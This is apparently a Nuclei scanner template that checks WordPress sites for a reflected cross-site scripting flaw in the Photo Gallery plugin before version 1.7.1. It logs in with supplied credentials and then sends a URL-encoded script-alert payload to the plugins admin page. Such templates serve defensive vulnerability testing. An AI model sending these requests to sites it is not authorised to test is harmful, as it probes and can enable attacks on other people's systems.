id: photo-gallery-xss
info:
  name: Photo Gallery < 1.7.1 - Cross-Site Scripting
  author: ritikchaddha
  severity: medium
  description: |
    The plugin does not escape some URLs before outputting them back in attributes, leading to Reflected Cross-Site Scripting.
  remediation: This is resolved in release 1.7.1.
  reference:
    - https://wpscan.com/vulnerability/e9f9bfb0-7cb8-4f92-b436-f08442a6c60a
    - https://wordpress.org/plugins/photo-gallery/advanced/
  classification:
    cwe-id:
      - CWE-80
    cpe: cpe:2.3:a:10web:photo_gallery:*:*:*:*:wordpress:*:*:*
  metadata:
    runzero-review: REJECT/2025-11-07/excluding tag authenticated
    max-request: 2
    product: photo_gallery
    publicwww-query: /wp-content/plugins/photo-gallery
    vendor: 10web
    verified: true
  tags: authenticated,photo-gallery,vuln,wordpress,wp,wp-plugin,wpscan,xss
http:
  - matchers:
      - condition: and
        part: body_2
        type: word
        words:
          - '><script>alert(/XSS/)</script>'
          - Installed Plugins
      - part: header_2
        type: word
        words:
          - text/html
      - status:
          - 200
        # digest: 4a0a0047304502207ac2e136ec9107d3ff5194a1b2c63dabf2265abc3422e085765a401c7151b1cd022100ec211e9cf46176db9da58cca6e9857d2c3480a019f6454696906446047be7638:922c64590222798bb761d5b6d8e72950

        type: status
    matchers-condition: and
    raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
      - |
        GET /wp-admin/plugins.php?%22%3E%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E HTTP/1.1
        Host: {{Hostname}}
